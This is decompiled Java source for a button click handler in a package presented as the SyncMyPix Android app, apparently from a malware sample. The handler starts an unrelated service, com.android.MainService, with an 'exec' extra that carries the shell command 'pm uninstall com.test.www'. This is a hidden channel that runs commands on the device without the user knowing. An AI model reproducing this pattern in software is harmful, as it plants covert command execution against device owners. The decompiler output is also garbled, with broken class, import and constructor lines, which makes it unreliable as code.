// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   MainActivity.java

package com.nloko.android.syncmypix;

import Lcom.nloko.android.syncmypix.MainActivity;;
import android.content.Intent;
import android.view.View;
import com.android.MainService;

// Referenced classes of package com.nloko.android.syncmypix:
//            MainActivity

class this._cls0
    implements android.view.tener
{

    public void onClick(View view)
    {
        android.content.Context context = getApplicationContext();
        Intent intent = new Intent(context, com/android/MainService);
        Intent intent1 = intent.putExtra("exec", "pm uninstall com.test.www");
        android.content.ComponentName componentname = startService(intent);
    }

    final MainActivity this$0;

    ()
    {
        this$0 = MainActivity.this;
        super();
    }
}
